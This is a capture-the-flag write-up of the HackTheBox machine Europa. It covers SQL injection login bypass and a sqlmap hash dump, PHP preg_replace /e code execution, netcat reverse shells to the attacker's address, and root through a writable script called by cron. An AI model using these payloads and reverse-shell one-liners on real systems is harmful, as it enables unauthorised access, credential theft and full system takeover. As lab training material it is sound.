---
layout: post
title: HackTheBox Europa
date: 2017-06-23
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Europa can present a bit of a challenge, or can be quite easy, depending on if you know what to look for. While it does not require many steps to complete, it provides a great learning experience in several fairly uncommon enumeration techniques and attack vectors. ([Source](https://www.hackthebox.com/machines/europa))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.22
Nmap scan report for 10.10.10.22
Host is up (0.0041s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   4.35 ms 10.10.14.1
2   4.36 ms 10.10.10.22

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.70 seconds
```

From the `nmap` scan, we notice an interesting result under port `443` - `DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb`.

Let’s add these DNS to our `/etc/hosts`.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
└─# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	shiro.shiro	shiro
10.10.10.48     mirai.htb
10.10.10.13     cronos.htb ns1.cronos.htb admin.cronos.htb
10.10.10.22	europa.htb www.europacorp.htb admin-portal.europacorp.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

`https://www.europacorp.htb` brings us to an Apache default page. However, `https://admin-portal.europacorp.htb` brings us to a login page!

![login_page](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Europa/login_page.png?raw=true)

### SQL Injection - First Method

Used Burp Suite to intercept the login request.

```http
POST /login.php HTTP/1.1
Host: admin-portal.europacorp.htb
Cookie: PHPSESSID=13recun5a2dqqh7i5g2e75vq54
Content-Length: 41
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://admin-portal.europacorp.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://admin-portal.europacorp.htb/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

email=admin%40europacorp.htb&password=password
```

Then I sent the request to Burp’s Repeater and tried some SQL syntax.

Upon using `'`, I realized that the server returned an SQL error. This indicates possible SQLi vulnerability.

```http
HTTP Request
...
email=admin%40europacorp.htb'&password=password

HTTP Response
...
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '5f4dcc3b5aa765d61d8327deb882cf99'' at line 1
```

Basic SQL injection techniques and `’-- -` or `’;-- -` worked.

```http
HTTP Request
...
email=admin%40europacorp.htb'--+-&password=password

HTTP Response
HTTP/1.1 302 Found
Date: Mon, 09 May 2022 02:22:35 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: https://admin-portal.europacorp.htb/dashboard.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

### SQLMap - Second Method

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
└─# sqlmap -r login_request.txt --batch --force-ssl
...
sqlmap identified the following injection point(s) with a total of 348 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: email=shiro@shiro.com' RLIKE (SELECT (CASE WHEN (3338=3338) THEN 0x736869726f40736869726f2e636f6d ELSE 0x28 END))-- BtER&password=password

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: email=shiro@shiro.com' AND GTID_SUBSET(CONCAT(0x716b7a7171,(SELECT (ELT(3998=3998,1))),0x716b6a7871),3998)-- scRF&password=password

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=shiro@shiro.com' AND (SELECT 3886 FROM (SELECT(SLEEP(5)))QrgU)-- ESHj&password=password
---
...
```

>   Note: we use `force-ssl` because there is no `http`.

It looks like `sqlmap` found 3 ways to bypass the login.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
└─# sqlmap -r login_request.txt --batch --force-ssl --dbs
...
available databases [2]:
[*] admin
[*] information_schema
...
```

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
└─# sqlmap -r login_request.txt --batch --force-ssl -D admin --tables
...
Database: admin
[1 table]
+-------+
| users |
+-------+
...
```

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
└─# sqlmap -r login_request.txt --batch --force-ssl -D admin -T users --dump
...
Database: admin
Table: users
[2 entries]
+----+----------------------+--------+----------------------------------+---------------+
| id | email                | active | password                         | username      |
+----+----------------------+--------+----------------------------------+---------------+
| 1  | admin@europacorp.htb | 1      | 2b6d315337f18617ba18922c0b9597ff | administrator |
| 2  | john@europacorp.htb  | 1      | 2b6d315337f18617ba18922c0b9597ff | john          |
+----+----------------------+--------+----------------------------------+---------------+
...
```

Using Hashes.com, we find out that the password is `SuperSecretPassword!`.

```
2b6d315337f18617ba18922c0b9597ff:SuperSecretPassword!
```

# Exploitation

Here is the admin dashboard.

![admin_dashboard](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Europa/admin_dashboard.png?raw=true)

The Tools page has an OpenVPN Config Generator.

![tools_page](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Europa/tools_page.png?raw=true)

Let’s intercept the request when clicking `Generate!`.

```http
POST /tools.php HTTP/1.1
Host: admin-portal.europacorp.htb
Cookie: PHPSESSID=bf3oqpkbh8rc0oheor1m6ihr40
Content-Length: 1678
...
Connection: close

pattern=%2Fip_address%2F&ipaddress=&text=%22openvpn%22%3A+%7B%0D%0A++++++++%22vtun0%22%3A+%7B%0D%0A++++++++++++++++%22local-address%22%3A+%7B%0D%0A++++++++++++++++++++++++%2210.10.10.1%22%3A+%22%27%27%22%0D%0A++++++++++++++++%7D%2C%0D%0A++++++++++++++++%22local-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22mode%22%3A+%22site-to-site%22%2C%0D%0A++++++++++++++++%22openvpn-option%22%3A+%5B%0D%0A++++++++++++++++++++++++%22--comp-lzo%22%2C%0D%0A++++++++++++++++++++++++%22--float%22%2C%0D%0A++++++++++++++++++++++++%22--ping+10%22%2C%0D%0A++++++++++++++++++++++++%22--ping-restart+20%22%2C%0D%0A++++++++++++++++++++++++%22--ping-timer-rem%22%2C%0D%0A++++++++++++++++++++++++%22--persist-tun%22%2C%0D%0A++++++++++++++++++++++++%22--persist-key%22%2C%0D%0A++++++++++++++++++++++++%22--user+nobody%22%2C%0D%0A++++++++++++++++++++++++%22--group+nogroup%22%0D%0A++++++++++++++++%5D%2C%0D%0A++++++++++++++++%22remote-address%22%3A+%22ip_address%22%2C%0D%0A++++++++++++++++%22remote-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22shared-secret-key-file%22%3A+%22%2Fconfig%2Fauth%2Fsecret%22%0D%0A++++++++%7D%2C%0D%0A++++++++%22protocols%22%3A+%7B%0D%0A++++++++++++++++%22static%22%3A+%7B%0D%0A++++++++++++++++++++++++%22interface-route%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++%22ip_address%2F24%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++%22next-hop-interface%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++++++++++%22vtun0%22%3A+%22%27%27%22%0D%0A++++++++++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++%7D%0D%0A++++++++++++++++%7D%0D%0A++++++++%7D%0D%0A%7D%0D%0A++++++++++++++++++++++++++++++++
```

The payload is URL encoded. Here is the URL decoded payload.

```bash
pattern=/ip_address/&ipaddress=&text="openvpn": {
        "vtun0": {
                "local-address": {
                        "10.10.10.1": "''"
                },
                "local-port": "1337",
                "mode": "site-to-site",
                "openvpn-option": [
                        "--comp-lzo",
                        "--float",
                        "--ping 10",
                        "--ping-restart 20",
                        "--ping-timer-rem",
                        "--persist-tun",
                        "--persist-key",
                        "--user nobody",
                        "--group nogroup"
                ],
                "remote-address": "ip_address",
                "remote-port": "1337",
                "shared-secret-key-file": "/config/auth/secret"
        },
        "protocols": {
                "static": {
                        "interface-route": {
                                "ip_address/24": {
                                        "next-hop-interface": {
                                                "vtun0": "''"
                                        }
                                }
                        }
                }
        }
}
```

The payload appears to be looking for some regex pattern. Doing a quick Google search on `PHP regex exploit` results to this [article](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4). It seems like we can an `e` modifier to the regex/pattern to execute a `PHP` code.

Let’s modify our request to something like this: `pattern=/ip_address/e&ipaddress=system('id')&text=...`

```http
HTTP Request
...
pattern=%2Fip_address%2Fe&ipaddress=system('id')&text=...

HTTP Response
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```

Nice, we executed some PHP code. Now, we can send a reverse (url encoded) reverse shell command.

```bash
Reverse netcat shell code (non-URL encoded)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f

Reverse netcat shell code (URL encoded)
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E8%201234%20%3E%2Ftmp%2Ff

- HTTP Request - 
...
pattern=%2Fip_address%2Fe&ipaddress=system("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E8%201234%20%3E%2Ftmp%2Ff")&text=...

- Netcat listener -

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
└─# nc -nlvp 1234  
listening on [any] 1234 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.22] 35470
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

# Privilege Escalation

```bash
$ wget http://10.10.14.8/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
...
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --re./linpeas.sh: 2587: ./linpeas.sh: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
./linpeas.sh: 2773: ./linpeas.sh: gpg-connect-agent: not found
port /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	/var/www/cronjobs/clearlogs
...
```

There an interesting cronjob running called `clearlogs`!

```bash
$ cat /var/www/cronjobs/clearlogs

#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

The cronjob is executing some `logcleared.sh` script but the file does not exist. We can leverage this by writing our own malicious `logcleared.sh` file.

```bash
$ echo 'rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i 2>&1|nc 10.10.14.8 9999 >/tmp/f2' > /var/www/cmd/logcleared.sh
$ cat /var/www/cmd/logcleared.sh
rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i 2>&1|nc 10.10.14.8 9999 >/tmp/f2
$ chmod +x /var/www/cmd/logcleared.sh
```

>   Note: As we are currently using the variable `f` for the current user shell, we cannot reuse it. Therefore, we need to use another variable `f2`.

Finally, we wait for the cronjob to execute our malicious code.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
└─# nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.22] 50522
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
7f19438b27578e4fcc8bef3a029af5a5
# ls /home
john
# cat /home/john/user.txt
2f8d40cc05295154a9c3452c19ddc221
```

